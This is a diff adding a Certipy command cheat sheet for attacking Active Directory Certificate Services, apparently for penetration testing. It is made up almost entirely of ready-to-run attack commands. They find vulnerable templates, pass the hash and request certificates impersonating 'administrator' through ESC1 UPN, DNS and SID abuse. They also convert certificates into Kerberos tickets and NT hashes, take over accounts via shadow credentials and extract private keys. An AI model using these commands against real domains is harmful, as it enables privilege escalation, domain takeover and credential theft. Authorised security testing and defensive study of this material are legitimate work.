@@ -1,0 +1,60 @@
+% certipy, adcs, ad
+
+; --- enumeration (certipy find) ---
+# Quick triage: vulnerable templates to stdout
+certipy find -u '<user>@<domain>' -p <pass> -k -target dc.<domain> -dc-ip <ip> -vulnerable -stdout
+
+# Machine account auth
+certipy find -u '<host>$@<domain>' -p <pass> -k -target dc.<domain> -dc-ip <ip> -vulnerable -stdout
+
+# Full enum (writes JSON + txt + zip)
+certipy find -u '<user>@<domain>' -p <pass> -k -target dc.<domain> -dc-ip <ip>
+
+# Via NT hash (pass-the-hash, no -k)
+certipy find -u '<user>@<domain>' -hashes :<nthash> -target dc.<domain> -dc-ip <ip> -vulnerable -stdout
+
+# Via existing kerberos ticket (KRB5CCNAME)
+certipy find -u '<user>@<domain>' -k -no-pass -target dc.<domain> -dc-ip <ip> -vulnerable -stdout
+
+# Filter scope (enabled, hide admins)
+certipy find -u '<user>@<domain>' -p <pass> -k -target dc.<domain> -dc-ip <ip> -enabled -hide-admins
+
+; --- request certs (ESC1/2/3/4/6/9/10/11) ---
+# Straight request as self
+certipy req -u '<user>@<domain>' -p <pass> -k -target dc.<domain> -dc-ip <ip> -ca <ca> -template <template>
+
+# ESC1 UPN abuse: request a cert for another user
+certipy req -u '<user>@<domain>' -p <pass> -k -target dc.<domain> -dc-ip <ip> -ca <ca> -template <template> -upn 'administrator@<domain>'
+
+# ESC1/ESC6 SAN: alternate DNS name
+certipy req -u '<user>@<domain>' -p <pass> -k -target dc.<domain> -dc-ip <ip> -ca <ca> -template <template> -dns dc.<domain>
+
+# ESC1 set SID directly
+certipy req -u '<user>@<domain>' -p <pass> -k -target dc.<domain> -dc-ip <ip> -ca <ca> -template <template> -sid <sid>
+
+# ESC8/ESC11 web enrollment endpoint
+certipy req -u '<user>@<domain>' -p <pass> -ca <ca> -target <ca_host> -template <template> -web
+
+; --- auth with a cert (cert -> TGT + NT hash) ---
+# Auth with a pfx
+certipy auth -pfx <user>.pfx -dc-ip <ip>
+
+# pfx with a password
+certipy auth -pfx <user>.pfx -password <pfx_pass> -dc-ip <ip>
+
+# Pick a UPN/domain when cert has multiple SANs
+certipy auth -pfx <user>.pfx -dc-ip <ip> -username administrator -domain <domain>
+
+; --- shadow credentials (msDS-KeyCredentialLink) ---
+# Auto: add -> auth as target -> clean up
+certipy shadow auto -u '<user>@<domain>' -p <pass> -k -target dc.<domain> -dc-ip <ip> -account <target>
+
+# List key credentials
+certipy shadow list -u '<user>@<domain>' -p <pass> -k -target dc.<domain> -dc-ip <ip> -account <target>
+
+; --- parse / inspect a pfx ---
+# Extract the key
+certipy cert -pfx <user>.pfx -nocert -out <user>.key
+
+# Extract the cert
+certipy cert -pfx <user>.pfx -nokey -out <user>.crt
